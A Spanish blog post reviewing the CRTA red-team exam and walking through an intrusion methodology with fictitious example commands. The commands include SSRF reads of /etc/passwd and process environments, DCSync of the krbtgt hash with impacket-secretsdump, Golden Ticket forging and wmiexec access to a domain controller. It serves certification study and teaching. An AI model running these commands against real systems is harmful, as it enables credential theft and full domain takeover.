---
layout: post
title: "CRTA: análisis técnico del examen y metodología de intrusión"
date: 2026-08-05
categories: [red-team, active-directory, certificaciones]
tags: [crta, red-team, active-directory, linux, docker, pivoting, kerberos]
image:
  path: /img/CERTS/CRTA.png
---

## Antes de empezar

La **CRTA — Certified Red Team Analyst** de CyberWarFare Labs plantea un escenario práctico en el que varias fases de una intrusión deben conectarse dentro de un mismo entorno.

No es un examen para entrar directamente a Active Directory y comenzar a ejecutar herramientas contra el controlador de dominio. Antes de llegar a esa etapa es necesario entender la superficie expuesta, separar servicios, identificar filtraciones de información, conseguir acceso inicial, revisar un servidor Linux, analizar contenedores, descubrir una red interna y recién entonces comenzar a trabajar sobre el dominio.

Ese detalle cambia bastante la experiencia.

La dificultad no está únicamente en conocer técnicas aisladas. El reto está en mantener un flujo ordenado mientras el contexto cambia entre:

- aplicaciones web,
- servicios auxiliares,
- Linux,
- Docker,
- redes internas,
- pivoting,
- Windows,
- Kerberos,
- y Active Directory.

En las siguientes secciones se reconstruye ese recorrido de forma técnica, explicando qué se puede revisar en cada punto, por qué tiene sentido hacerlo y qué nuevo paso podría habilitar cada hallazgo.

> Este artículo no es un walkthrough del examen. Todos los dominios, direcciones IP, credenciales, hashes, rutas y valores utilizados como ejemplo son ficticios o han sido modificados.

---

## Certificación 

La credencial oficial puede validarse desde el siguiente enlace: [Ver certificado oficial](https://labs.cyberwarfare.live/credential/achievement/6a41e99d265336623faeb05a) 

Este reel resume el feedback de forma más casual: {% include embed/youtube.html id='mFtNsrrXkkM' %}

---

## ¿Qué propone el examen?

El examen entrega aproximadamente **6 horas** para comprometer el entorno y responder las preguntas planteadas.

Ese tiempo puede ser suficiente para alguien que ya trabaja con cierta comodidad en:

- enumeración web,
- Linux,
- escalada de privilegios,
- Docker,
- redes internas,
- pivoting,
- Active Directory,
- NetExec,
- Impacket,
- y Kerberos.

Con experiencia previa, el entorno puede resolverse antes. Sin embargo, tener conocimientos de cada área por separado no garantiza avanzar rápido.

El tiempo suele perderse cuando:

- se mezclan hallazgos de servicios diferentes,
- se ejecutan herramientas sin una hipótesis clara,
- no se documenta qué evidencia pertenece a cada host,
- se intenta atacar Active Directory antes de completar la fase inicial,
- o se realizan búsquedas demasiado amplias que generan ruido.

La certificación no premia únicamente la cantidad de comandos ejecutados. Premia la capacidad de mantener contexto.

---

## El laboratorio de práctica no replica exactamente el examen

El laboratorio disponible sirve para practicar conceptos y entrar en ritmo, pero no debería tomarse como una copia exacta del escenario final.

En el examen pueden aparecer capas adicionales que requieren más análisis, por ejemplo:

- servicios Linux,
- escalada local,
- contenedores Docker,
- aplicaciones auxiliares,
- revisión de código fuente,
- o credenciales expuestas fuera de Active Directory.

Esto es importante porque obliga a estudiar el dominio como la última parte de una cadena, no como un tema aislado.

El flujo general se puede representar así:

<div style="border:1px solid #3a3a3a; border-radius:12px; padding:24px; background:#111318; margin:2rem 0; overflow-x:auto;">
  <div style="display:flex; flex-wrap:wrap; gap:10px; align-items:center; justify-content:center; color:#ddd; font-size:.95rem; line-height:1.5;">
    <span style="padding:10px 14px; border:1px solid #ff3b3b; border-radius:8px;">Superficie web</span>
    <span>→</span>
    <span style="padding:10px 14px; border:1px solid #ff6b35; border-radius:8px;">Filtración de información</span>
    <span>→</span>
    <span style="padding:10px 14px; border:1px solid #e6a700; border-radius:8px;">Acceso inicial</span>
    <span>→</span>
    <span style="padding:10px 14px; border:1px solid #47b881; border-radius:8px;">Escalada local</span>
    <span>→</span>
    <span style="padding:10px 14px; border:1px solid #3498db; border-radius:8px;">Docker y código</span>
    <span>→</span>
    <span style="padding:10px 14px; border:1px solid #8e6cef; border-radius:8px;">Red interna</span>
    <span>→</span>
    <span style="padding:10px 14px; border:1px solid #cc5de8; border-radius:8px;">Active Directory</span>
    <span>→</span>
    <span style="padding:10px 14px; border:1px solid #ff3b3b; border-radius:8px;">Objetivo final</span>
  </div>
</div>

La cadena parece sencilla cuando ya se conoce el resultado. Durante la operación, cada bloque puede corresponder a un host, un puerto, una tecnología y una hipótesis diferente.

---

# 1. Separar servicios antes de probar cosas

Uno de los primeros errores posibles en un escenario de este tipo es asumir que todos los puertos web pertenecen a la misma aplicación.

Un mismo servidor podría exponer:

| Puerto | Tecnología | Posible función |
|---:|---|---|
| `22` | SSH | Acceso remoto al host |
| `8080` | Node.js / Express | Aplicación de monitoreo |
| `23000` | Flask / Werkzeug | Servicio auxiliar |
| `80` | Apache | Aplicación interna distinta |

Aunque compartan dirección IP, técnicamente son contextos separados.

Por ejemplo:

```text
10.50.20.15:8080  → aplicación Node.js
10.50.20.15:23000 → servicio Flask
10.60.30.20:80    → servidor Apache interno
10.60.30.100:445  → controlador de dominio
```

Si se encuentra una ruta interesante en `8080`, no se debería asumir que también existe en `23000`.

Si una credencial aparece en el servidor Apache interno, no necesariamente pertenece al panel Node.js.

### Forma recomendada de documentarlo

```text
[HOST] 10.50.20.15
  [PORT] 8080
  [SERVICE] Node.js / Express
  [HYPOTHESIS] Panel de monitoreo con rutas no documentadas
  [TEST] Revisar HTML, JavaScript y assets
  [EVIDENCE] Se identifica una ruta pública de depuración
  [NEXT] Validar la ruta por HTTP

  [PORT] 23000
  [SERVICE] Flask / Werkzeug
  [HYPOTHESIS] Servicio auxiliar que procesa URLs
  [TEST] Revisar parámetros y protocolos aceptados
  [EVIDENCE] El endpoint recibe una URL como entrada
  [NEXT] Validar lectura local o SSRF
```

La regla práctica es simple:

> Cada combinación `IP:PUERTO` debe tener su propia hipótesis, prueba, evidencia y decisión.

---

# 2. Enumeración web con intención

La fase web no consiste únicamente en ejecutar fuzzing.

Herramientas como `nmap`, `curl`, `ffuf`, Burp Suite o Caido sirven para recolectar información, pero no deciden qué significa cada resultado.

## 2.1 Revisión inicial

```bash
curl -i http://web01.nagata-corporation.local/
curl -s http://web01.nagata-corporation.local/ | tee index.html
```

`-i` permite revisar headers como:

```text
Server
Set-Cookie
Location
Content-Type
X-Powered-By
```

Guardar el cuerpo con `tee` permite revisarlo después sin repetir la solicitud.

## 2.2 Descubrimiento de contenido

```bash
ffuf \
  -u http://web01.nagata-corporation.local/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -fc 404
```

Parámetros:

| Parámetro | Función |
|---|---|
| `-u` | URL objetivo |
| `FUZZ` | Posición donde se insertan palabras |
| `-w` | Wordlist |
| `-fc 404` | Filtra respuestas 404 |

Encontrar rutas como estas no confirma una vulnerabilidad:

```text
/assets/
/static/
/api/
/debug/
/backup/
```

Solo genera nuevas preguntas.

## 2.3 Preguntas que deben hacerse

- ¿Existe listado de directorios?
- ¿La aplicación expone archivos fuente?
- ¿Hay comentarios HTML?
- ¿Los JavaScript muestran endpoints internos?
- ¿Existen credenciales hardcodeadas?
- ¿Se revelan nombres de host?
- ¿Hay referencias a otros puertos?
- ¿Los assets contienen valores de configuración?
- ¿Hay rutas accesibles sin autenticación?

## 2.4 Revisar HTML

```bash
grep -niE 'api|admin|debug|backup|internal|token|secret|port' index.html
```

Los comentarios HTML pueden revelar información como:

```html
<!-- revisar el panel interno en /monitor -->
```

Una línea así no es una vulnerabilidad por sí sola, pero sí una pista.

## 2.5 Revisar JavaScript

```bash
grep -RniE 'fetch\(|axios|/api/|token|secret|password|admin' js/
```

En JavaScript suelen encontrarse:

- rutas no enlazadas,
- endpoints API,
- parámetros,
- nombres de campos,
- referencias a servicios internos,
- lógica de autenticación,
- configuraciones de desarrollo.

## 2.6 Revisar assets

```bash
find . -type f \( \
  -name "*.js" -o \
  -name "*.css" -o \
  -name "*.json" \
\)
```

Un archivo CSS no debería contener secretos, pero en entornos mal configurados puede incluir:

```css
:root {
  --db-user: "db_reader";
  --db-pass: "ExamplePassword!";
}
```

Ese tipo de filtración suele aparecer por:

- archivos de prueba incluidos en producción,
- comentarios olvidados,
- datos usados como placeholder,
- bundles generados desde código no sanitizado.

---

# 3. Cuando una aplicación solo apunta hacia otra

En este tipo de escenario, una aplicación puede no ser explotable directamente y aun así ser importante.

Puede actuar como puente:

```text
Aplicación A
    ↓
Ruta no documentada
    ↓
Referencia a servicio B
    ↓
Lectura de archivo
    ↓
Credencial
    ↓
Acceso SSH
```

Por ejemplo, una ruta de depuración podría devolver:

```json
{
  "message": "Check the auxiliary service",
  "service_port": 23000,
  "token": "example-value"
}
```

En ese punto se podrían plantear nuevas preguntas:

- ¿El servicio está expuesto externamente?
- ¿Escucha solo en localhost?
- ¿Qué framework utiliza?
- ¿Qué parámetros recibe?
- ¿Acepta URLs?
- ¿Permite protocolos distintos de HTTP?
- ¿Lee archivos del host o del contenedor?

La aplicación inicial no tendría que ser el objetivo final. Su valor estaría en revelar la siguiente pieza del recorrido.

---

# 4. Lectura de archivos y acceso inicial

Un servicio que recibe una URL puede introducir riesgos como:

- SSRF,
- acceso a servicios internos,
- lectura local mediante `file://`,
- acceso a metadata cloud,
- filtración de archivos de configuración.

Ejemplo ficticio:

```bash
curl --get \
  "http://web01.nagata-corporation.local:23000/fetch" \
  --data-urlencode "url=file:///etc/passwd"
```

## 4.1 ¿Por qué usar `--data-urlencode`?

Permite enviar correctamente caracteres especiales dentro del parámetro.

Sin encoding, valores como:

```text
file:///etc/passwd
http://127.0.0.1:8080/api
```

podrían ser interpretados de forma incorrecta.

## 4.2 Contenedor frente a host

Si el servicio corre dentro de un contenedor, `file:///etc/passwd` podría leer el archivo del contenedor, no el del host.

Algunas arquitecturas montan el filesystem del host dentro del contenedor:

```text
/hostfs
/mnt/host
/host
```

En ese caso, una prueba genérica podría ser:

```bash
curl --get \
  "http://web01.nagata-corporation.local:23000/fetch" \
  --data-urlencode "url=file:///hostfs/etc/passwd"
```

No se debería probar una ruta al azar. Primero habría que buscar evidencia de un montaje o una indicación del propio servicio.

## 4.3 Qué archivos revisar

En un entorno autorizado:

```text
/etc/passwd
/etc/hosts
/proc/self/cmdline
/proc/self/environ
/app/.env
/opt/app/config.json
/var/log/auth.log
```

La lectura debe tener un objetivo concreto:

| Archivo | Posible utilidad |
|---|---|
| `/etc/passwd` | Usuarios y shells |
| `/etc/hosts` | Hostnames internos |
| `/proc/self/cmdline` | Comando del proceso |
| `/proc/self/environ` | Variables de entorno |
| `.env` | Credenciales o configuración |
| `auth.log` | IPs y accesos previos |

---

# 5. Acceso inicial a Linux

Cuando se obtiene una credencial válida, el siguiente paso es entrar al host y entender el contexto.

```bash
ssh analyst@10.50.20.15
```

Antes de ejecutar scripts de enumeración automática, conviene revisar manualmente:

```bash
whoami
id
hostname
uname -a
ip a
ip route
sudo -l
ss -tulpn
ps auxww
```

## 5.1 Qué responde cada comando

| Comando | Pregunta que responde |
|---|---|
| `whoami` | ¿Qué usuario está activo? |
| `id` | ¿Qué grupos y privilegios tiene? |
| `hostname` | ¿En qué host se está trabajando? |
| `uname -a` | ¿Qué kernel y arquitectura usa? |
| `ip a` | ¿Qué interfaces existen? |
| `ip route` | ¿Qué redes son alcanzables? |
| `sudo -l` | ¿Qué puede ejecutar con sudo? |
| `ss -tulpn` | ¿Qué servicios escucha el host? |
| `ps auxww` | ¿Qué procesos están activos? |

La intención es construir un mapa del host antes de buscar una escalada.

---

# 6. Escalada local: configuración antes que exploit

No todas las escaladas dependen de una CVE.

También pueden aparecer por:

- reglas `sudo` demasiado permisivas,
- binarios SUID,
- capabilities,
- servicios ejecutados como root,
- tareas programadas,
- credenciales en archivos,
- sockets accesibles,
- Docker,
- montajes inseguros.

Revisión inicial:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## 6.1 `sudo -l`

Este comando muestra qué binarios puede ejecutar el usuario mediante sudo.

Si aparece una herramienta capaz de:

- ejecutar comandos,
- abrir una shell,
- cargar plugins,
- escribir archivos,
- o invocar un editor,

se debería revisar su comportamiento antes de buscar exploits de kernel.

El punto técnico es importante:

> En muchas escaladas no se rompe el software. Se abusa de una capacidad legítima concedida al usuario equivocado.

---

# 7. Por qué aparece Docker en la investigación

Al revisar puertos con:

```bash
ss -tulpn
```

se puede observar algo como:

```text
docker-proxy
```

Eso indica que un puerto del host está publicado desde un contenedor.

A partir de ese hallazgo, revisar únicamente `/var/www`, `/opt` o `/srv` puede ser insuficiente.

La aplicación podría vivir dentro de:

- una imagen Docker,
- un volumen,
- un bind mount,
- o el filesystem aislado del contenedor.

## 7.1 Enumerar contenedores

```bash
docker ps -a
docker images
```

## 7.2 Revisar configuración

```bash
docker inspect <container>
```

`docker inspect` puede revelar:

- variables de entorno,
- puertos,
- comando de inicio,
- imagen utilizada,
- mounts,
- redes,
- dirección IP interna.

## 7.3 Variables de entorno

```bash
docker inspect <container> \
  --format '{{range .Config.Env}}{{println .}}{{end}}'
```

Ejemplo ficticio:

```text
APP_ADMIN_USER=admin
APP_ADMIN_PASSWORD=ExamplePassword123!
APP_PORT=8080
JWT_SECRET=example-secret
```

Las variables de entorno son un punto frecuente de filtración porque muchas aplicaciones reciben secretos desde Docker Compose o desde el comando `docker run`.

## 7.4 Montajes

```bash
docker inspect <container> \
  --format '{{json .Mounts}}'
```

Salida conceptual:

```json
[
  {
    "Source": "/srv/app-data",
    "Destination": "/var/lib/app/data"
  }
]
```

Esto significa:

```text
Host:       /srv/app-data
Contenedor: /var/lib/app/data
```

La información persistente podría incluir:

- bases SQLite,
- JSON,
- tokens,
- configuraciones,
- usuarios,
- logs.

## 7.5 Revisar logs

```bash
docker logs <container>
```

Los logs pueden mostrar:

- rutas,
- errores,
- conexiones internas,
- variables mal impresas,
- nombres de archivos,
- stack traces.

---

# 8. Inspección mediante `/proc/<PID>/root`

Cuando se dispone de root en el host, el filesystem visto por un proceso puede revisarse desde:

```text
/proc/<PID>/root/
```

Primero se identifica el proceso:

```bash
ps auxww | grep -E 'node|python|java|gunicorn' | grep -v grep
```

Luego se obtiene su directorio de trabajo:

```bash
readlink -f /proc/1234/cwd
```

Y el comando completo:

```bash
tr '\0' ' ' < /proc/1234/cmdline
```

Finalmente:

```bash
ls -la /proc/1234/root/
```

## 8.1 ¿Qué permite entender?

- desde qué ruta se ejecuta el servicio,
- dónde está el código,
- qué archivos ve el proceso,
- qué configuraciones carga,
- si vive dentro de un contenedor,
- qué mounts están disponibles.

## 8.2 Ejemplo

```bash
readlink -f /proc/1234/cwd
```

Resultado ficticio:

```text
/code
```

Entonces se puede revisar:

```bash
find /proc/1234/root/code -maxdepth 3 -type f
```

Esto permite analizar el código real sin depender de lo que exponga la aplicación por HTTP.

---

# 9. Análisis de código fuente con scope reducido

Buscar en todo el filesystem genera demasiado ruido.

Esto:

```bash
grep -Rni "password" /
```

normalmente devuelve miles de resultados inútiles.

La búsqueda debería limitarse a la ruta de la aplicación.

## 9.1 Node.js / Express

```bash
grep -RniE \
  'app\.get|app\.post|router\.|process\.env|express\.static|secret|password|token' \
  /code/src 2>/dev/null
```

Puntos de interés:

- rutas no documentadas,
- middlewares,
- autenticación,
- variables de entorno,
- archivos estáticos,
- endpoints API,
- valores hardcodeados.

## 9.2 Flask

```bash
grep -RniE \
  '@app\.route|request\.args|request\.form|open\(|requests\.get|subprocess|os\.system' \
  /app 2>/dev/null
```

Puntos de interés:

- rutas,
- parámetros,
- lectura de archivos,
- solicitudes HTTP,
- ejecución de procesos,
- validaciones incompletas.

## 9.3 Ver líneas cercanas

Cuando `grep` encuentra una coincidencia:

```bash
nl -ba src/index.js | sed -n '40,90p'
```

`nl -ba` agrega números de línea.  
`sed -n` permite mostrar solo el bloque relevante.

La revisión cercana es necesaria porque una palabra como `secret` puede aparecer en una librería sin tener relación con el objetivo.

---

# 10. Descubrimiento de red interna

Una vez obtenido acceso al host Linux, se debe revisar si existen redes adicionales.

```bash
ip a
ip route
arp -a
```

También se pueden revisar conexiones y logs:

```bash
ss -antp
cat ~/.bash_history
grep -RniE '10\.[0-9]+\.[0-9]+\.[0-9]+' /var/log 2>/dev/null
```

## 10.1 Qué puede aparecer

- IPs internas,
- servidores usados por administradores,
- nombres de host,
- conexiones SSH,
- endpoints de bases de datos,
- controladores de dominio,
- gateways.

En un laboratorio, los logs pueden ser una pista intencional. En un pentest real, también pueden revelar relaciones operativas.

### Idea clave

> No siempre es necesario escanear todo el segmento para encontrar el siguiente activo. La evidencia local puede indicar dónde mirar.

---

# 11. Confirmar si ya existe una ruta

Antes de configurar Ligolo, Chisel o un túnel SSH, se debería comprobar si Kali ya alcanza la red interna.

```bash
ip route get 10.60.30.20
```

Una salida como:

```text
10.60.30.20 via 192.168.90.1 dev tun1 src 192.168.90.73
```

indica que ya existe una ruta.

En ese caso, montar otro túnel sería innecesario y podría introducir más complejidad.

## 11.1 Descubrimiento controlado

```bash
fping -a -g 10.60.30.1 10.60.30.254
```

Parámetros:

| Parámetro | Función |
|---|---|
| `-a` | Muestra hosts vivos |
| `-g` | Genera el rango |

Después se debería escanear cada host por separado y sin mezclar resultados.

---

# 12. Pivoting: Ligolo, Chisel, SOCKS y SSH

Las herramientas de pivoting no son completamente equivalentes.

La elección depende de qué tipo de conectividad se necesita.

## 12.1 Ligolo-ng

Ligolo-ng crea una interfaz TUN y permite trabajar de forma parecida a tener una ruta real hacia la red interna.

Ventajas:

- integración natural con herramientas,
- no requiere envolver cada comando con proxychains,
- facilita SMB, LDAP, WinRM y otros protocolos TCP,
- ofrece una experiencia similar a routing.

Mentalmente:

```text
Kali tiene una ruta hacia la red interna
```

## 12.2 Chisel

Chisel crea túneles TCP sobre HTTP/WebSocket.

Puede utilizarse para:

- SOCKS,
- local forwarding,
- reverse forwarding.

Mentalmente:

```text
una conexión TCP viaja dentro de un túnel
```

## 12.3 SOCKS y Proxychains

Flujo:

```text
Herramienta
   ↓
Proxychains
   ↓
SOCKS
   ↓
Pivote
   ↓
Red interna
```

Limitaciones habituales:

- ICMP no funciona como routing,
- UDP suele ser problemático,
- DNS puede resolverse fuera del túnel,
- algunas herramientas no se comportan bien con proxychains,
- los escaneos SYN no funcionan como en una ruta directa.

## 12.4 SSH Dynamic Forwarding

```bash
ssh -D 1080 user@pivot
```

Esto crea un proxy SOCKS local.

## 12.5 SSH Local Forwarding

```bash
ssh -L 8443:internal.example:443 user@pivot
```

Permite alcanzar un servicio concreto:

```text
localhost:8443 → internal.example:443
```

## 12.6 SSH Remote Forwarding

```bash
ssh -R 9000:127.0.0.1:9000 user@pivot
```

Publica en el servidor remoto un puerto que apunta hacia el cliente.

---

## 12.7 ¿Trabajan en la misma capa del modelo OSI?

Reducir la comparación a “capa 3 contra capa 7” puede ser engañoso.

Una comparación más útil es operativa:

| Técnica | Resultado práctico |
|---|---|
| Ligolo-ng | Routing mediante interfaz TUN |
| Chisel SOCKS | Proxy TCP transportado sobre HTTP/WebSocket |
| SSH `-D` | Proxy SOCKS dinámico |
| SSH `-L` | Reenvío TCP a un destino específico |
| Proxychains | Envía conexiones de aplicaciones a través de SOCKS |

Las preguntas correctas serían:

```text
¿Se necesita conectividad IP general?
¿Solo hay que llegar a un puerto?
¿Se necesita resolver DNS interno?
¿La herramienta utiliza TCP, UDP o ICMP?
¿Se puede instalar un agente?
¿Existe acceso SSH?
¿Hay restricciones de salida?
```

---

# 13. Enumeración de Active Directory

Una vez alcanzada la red interna, primero se identifica el dominio.

Puertos típicos:

| Puerto | Servicio |
|---:|---|
| `53` | DNS |
| `88` | Kerberos |
| `135` | RPC |
| `389` | LDAP |
| `445` | SMB |
| `464` | Cambio de password Kerberos |
| `636` | LDAPS |
| `3268` | Global Catalog |
| `5985` | WinRM |
| `9389` | AD Web Services |

## 13.1 Confirmar SMB

```bash
nxc smb 10.60.30.100
```

Puede revelar:

- hostname,
- dominio,
- versión de Windows,
- SMB signing,
- arquitectura.

## 13.2 Confirmar LDAP

```bash
nxc ldap 10.60.30.100
```

## 13.3 Enumeración adicional

```bash
enum4linux-ng -A 10.60.30.100
```

Información útil:

```text
Dominio DNS
Dominio NetBIOS
FQDN del DC
SID del dominio
SMB signing
LDAP disponible
```

El objetivo inicial no es explotar. Es construir el mapa correcto del dominio.

---

# 14. Validación de credenciales

Si se encuentra una cuenta de dominio:

```text
sync_service@nagata-corporation.local
ExamplePassword!
```

primero se valida:

```bash
nxc smb 10.60.30.100 \
  -u 'sync_service' \
  -p 'ExamplePassword!' \
  -d nagata-corporation.local
```

Y por LDAP:

```bash
nxc ldap 10.60.30.100 \
  -u 'sync_service' \
  -p 'ExamplePassword!' \
  -d nagata-corporation.local
```

No se debería asumir que una credencial es válida solo porque apareció en un archivo.

La validación responde:

```text
¿La cuenta existe?
¿La password sigue vigente?
¿El dominio es correcto?
¿SMB o LDAP permiten autenticación?
```

---

# 15. DCSync: por qué una cuenta de sincronización importa

Una cuenta vinculada a sincronización de directorio merece atención especial.

Si posee permisos de replicación, podría realizar DCSync.

## 15.1 Qué hace DCSync

DCSync utiliza los mecanismos de replicación de Active Directory para solicitar secretos al controlador de dominio.

No requiere copiar manualmente `NTDS.dit`.

Permisos relacionados:

```text
Replicating Directory Changes
Replicating Directory Changes All
Replicating Directory Changes In Filtered Set
```

## 15.2 Ejemplo sanitizado

```bash
impacket-secretsdump \
  'nagata-corporation.local/sync_service:ExamplePassword!@10.60.30.100' \
  -just-dc-user krbtgt
```

`-just-dc-user krbtgt` limita la solicitud a una sola cuenta.

La salida tendría un formato parecido a:

```text
krbtgt:502:LMHASH:NTHASH:::
```

El NT hash corresponde al cuarto campo.

No se publica aquí ningún valor real.

---

# 16. Golden Ticket: qué datos necesita

Un Golden Ticket es un TGT Kerberos falsificado utilizando el secreto de `krbtgt`.

Para construirlo se necesita:

- nombre del dominio,
- SID del dominio,
- secreto de `krbtgt`,
- usuario representado,
- grupos del ticket,
- resolución DNS correcta,
- hora sincronizada.

Ejemplo ficticio:

```bash
impacket-ticketer \
  -nthash 0123456789abcdef0123456789abcdef \
  -domain-sid S-1-5-21-111111111-222222222-333333333 \
  -domain nagata-corporation.local \
  Administrator
```

Luego:

```bash
export KRB5CCNAME=Administrator.ccache
```

Y acceso mediante Kerberos:

```bash
impacket-wmiexec \
  -k \
  -no-pass \
  dc01.nagata-corporation.local
```

## 16.1 Problemas frecuentes

- DNS incorrecto,
- FQDN equivocado,
- clock skew,
- SID incorrecto,
- hash incorrecto,
- ccache no exportado,
- herramienta intentando NTLM,
- SPN no resuelto.

La técnica no debería reducirse a copiar un comando. Hay que entender qué dato alimenta cada parámetro.

---

# 17. Acceso al controlador de dominio

Herramientas Impacket como:

```text
wmiexec
psexec
smbexec
```

no hacen exactamente lo mismo.

| Herramienta | Característica general |
|---|---|
| `wmiexec` | Ejecución mediante WMI |
| `psexec` | Servicio remoto temporal |
| `smbexec` | Ejecución basada en SMB y servicio |

La selección depende de:

- privilegios,
- controles defensivos,
- ruido operativo,
- disponibilidad de protocolos,
- necesidad de una shell interactiva.

En un laboratorio, cualquiera puede servir si está permitido. En una operación real, la elección debería considerar detección y trazabilidad.

---

# 18. Buscar archivos en Windows sin generar miles de resultados

Buscar en todo `C:\` puede generar mucho ruido.

Ejemplo poco eficiente:

```cmd
dir C:\*.xml /s /b
```

Esto puede recorrer:

- Windows,
- ProgramData,
- junctions,
- repositorios internos,
- perfiles duplicados.

Además, Windows conserva junctions como:

```text
Documents and Settings
Application Data
```

que pueden producir rutas repetitivas.

## 18.1 Usar wildcards

Si el archivo podría tener doble extensión:

```cmd
where /r C:\Users *secret*.xml*
```

Esto puede encontrar:

```text
secret.xml
secret.xml.txt
backup-secret.xml.old
```

## 18.2 Limitar por perfiles

```cmd
for /d %u in (C:\Users\*) do @dir "%u\Desktop\*secret*.xml*" /b /s /a-d 2>nul
```

Parámetros:

| Parte | Función |
|---|---|
| `for /d` | Itera directorios |
| `%u` | Variable del perfil |
| `/b` | Solo rutas |
| `/s` | Recursivo |
| `/a-d` | Solo archivos |
| `2>nul` | Oculta errores |

## 18.3 Rutas prioritarias

Antes de buscar todo el disco:

```text
C:\Users
C:\ProgramData
C:\Shares
C:\Backup
C:\inetpub
C:\Windows\SYSVOL
```

La búsqueda debería seguir el contexto del reto.

---

# 19. El método que evita mezclar todo

La forma más útil de ordenar el trabajo fue:

```text
Hipótesis
   ↓
Prueba
   ↓
Resultado
   ↓
Decisión
```

## Ejemplo

```text
Hipótesis:
El puerto 8080 expone una aplicación Node.js con rutas no documentadas.

Prueba:
Revisar HTML, JavaScript, assets y código fuente.

Resultado:
Se identifica una ruta pública que referencia un servicio auxiliar.

Decisión:
Enumerar el servicio auxiliar sin asumir que pertenece a la misma aplicación.
```

Otro ejemplo:

```text
Hipótesis:
Los puertos publicados pertenecen a contenedores Docker.

Prueba:
Revisar ss, procesos y docker inspect.

Resultado:
Se identifican variables de entorno y un bind mount.

Decisión:
Analizar el volumen persistente y el código del contenedor.
```

---

# 20. Errores que consumen tiempo

## 20.1 Mezclar aplicaciones

```text
Puerto 8080 ≠ puerto 23000 ≠ servidor web interno
```

Cada uno requiere su propio análisis.

## 20.2 Ejecutar herramientas sin pregunta

Antes de un comando debería existir una pregunta:

```text
¿Qué espero confirmar?
```

## 20.3 Buscar demasiado amplio

Esto:

```bash
grep -Rni "password" /
```

genera ruido.

Mejor:

```bash
grep -RniE 'password|secret|token' /code/src
```

## 20.4 Atacar el DC demasiado pronto

Encontrar un controlador de dominio no significa que sea el siguiente paso inmediato.

Primero pueden faltar:

- credenciales,
- privilegios,
- rutas,
- DNS,
- contexto del usuario.

## 20.5 Buscar nombres exactos

Un archivo solicitado como “XML” podría llamarse:

```text
secret.xml.txt
```

Por eso conviene usar:

```cmd
*secret*.xml*
```

## 20.6 No comprobar rutas existentes

Antes de montar un pivote:

```bash
ip route get <IP>
```

---

# 21. Herramientas utilizadas alrededor de este tipo de flujo

## Reconocimiento y web

```text
nmap
naabu
curl
ffuf
Burp Suite
Caido
```

## Linux

```text
ssh
sudo
ss
ps
find
grep
getcap
journalctl
```

## Docker

```text
docker ps
docker inspect
docker logs
docker exec
/proc/<PID>/root
```

## Pivoting

```text
Ligolo-ng
Chisel
SSH port forwarding
SOCKS
Proxychains
```

## Active Directory

```text
NetExec / nxc
enum4linux-ng
ldapsearch
BloodHound
Impacket
Kerberos utilities
```

## Windows remoto

```text
wmiexec
psexec
smbexec
WinRM
SMB
PowerShell
CMD
```

---

# 22. Qué estudiar antes de rendir CRTA

## Web

- HTTP,
- headers,
- rutas,
- parámetros,
- directory discovery,
- JavaScript,
- assets,
- archivos expuestos,
- SSRF y lectura local a nivel conceptual.

## Linux

- permisos,
- `sudo -l`,
- SUID,
- capabilities,
- procesos,
- logs,
- servicios,
- SSH,
- networking.

## Docker

- contenedores,
- imágenes,
- variables de entorno,
- mounts,
- volúmenes,
- namespaces,
- `/proc/<PID>/root`.

## Redes

- subredes,
- rutas,
- TUN/TAP,
- SOCKS,
- port forwarding,
- proxychains,
- DNS interno.

## Active Directory

- SMB,
- LDAP,
- Kerberos,
- SIDs,
- cuentas de servicio,
- permisos de replicación,
- DCSync,
- tickets Kerberos.

## Windows

- perfiles,
- búsqueda de archivos,
- CMD,
- PowerShell,
- servicios remotos,
- resolución de nombres.

---

# 23. Valor técnico de la certificación

La impresión general es que CRTA funciona bien como práctica de integración.

No se queda únicamente en:

```text
enumerar usuarios
hacer Kerberoasting
ejecutar BloodHound
```

El entorno obliga a construir el camino hasta Active Directory.

Eso permite practicar:

- transición entre tecnologías,
- toma de decisiones,
- manejo de evidencia,
- validación de credenciales,
- pivoting,
- y abuso de relaciones de confianza.

No debería entenderse como una certificación que cubre todo Red Team.

Sí puede entenderse como una buena práctica para fortalecer metodología de intrusión en un escenario híbrido.

---

# 24. Conclusión

El punto más valioso del CRTA no es únicamente alcanzar el controlador de dominio.

El valor está en entender cómo una superficie web, una configuración insegura, una credencial expuesta, un servicio Linux, un contenedor y una cuenta de dominio pueden formar una sola cadena.

En seguridad ofensiva no basta con ejecutar herramientas.

Hay que saber:

```text
separar servicios,
reducir ruido,
correlacionar evidencia,
validar hipótesis,
y decidir el siguiente paso.
```

Cada hallazgo debería responder:

```text
¿Qué servicio se está evaluando?
¿Qué hipótesis existe?
¿Qué prueba se ejecutó?
¿Qué evidencia se obtuvo?
¿Qué siguiente paso habilita?
```

Ese enfoque convierte un laboratorio en conocimiento reutilizable.

También deja una tarea importante después de aprobar: volver a revisar el escenario con otras herramientas y comprobar si la misma lógica puede aplicarse de otra manera.

Por ejemplo:

- reemplazar Ligolo por Chisel,
- comparar routing con SOCKS,
- repetir enumeración con herramientas nativas,
- revisar qué controles defensivos habrían detectado cada etapa,
- y documentar no solo el comando, sino la razón técnica detrás de él.

Ahí es donde el examen deja de ser una secuencia de flags y se convierte en metodología.

---

## Nota final

Todos los dominios, IPs, credenciales, hashes, rutas y ejemplos técnicos incluidos en este artículo son ficticios o han sido modificados intencionalmente.

El contenido no publica flags, respuestas ni datos reales del examen.
